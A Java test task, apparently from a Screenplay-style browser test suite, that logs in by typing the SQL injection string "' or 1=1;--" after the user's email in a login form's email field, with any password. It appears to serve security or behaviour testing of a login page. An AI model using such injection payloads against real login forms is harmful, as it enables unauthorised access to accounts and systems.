package screenplays.tasks;

import common.User;
import screenplays.base.Actor;
import screenplays.base.abilities.Browser;
import screenplays.base.abilities.Login;

import static org.assertj.core.api.Assertions.assertThat;
import static screenplays.pages.LoginPage.*;


/**
 * Performs a login for the actor using an SQL injection attack.
 * If a user is logged in, a logout is performed first.
 */
public class PerformLoginAttack extends BrowserTask {

    @Override
    protected <T extends Actor> void performAsWith(T actor, Browser browser) {
        Tasks.forceNavigationToLoginPage().performAs(actor);

        User user = Login.as(actor).get();

        browser.find(emailField()).setText(user.email + "' or 1=1;--");
        browser.find(passwordField()).setText("any_password");
        browser.find(loginButton()).click();
    }

    @Override
    protected <T extends Actor> void assertTaskHadExpectedResult(T actor, Browser browser) {
    }

}
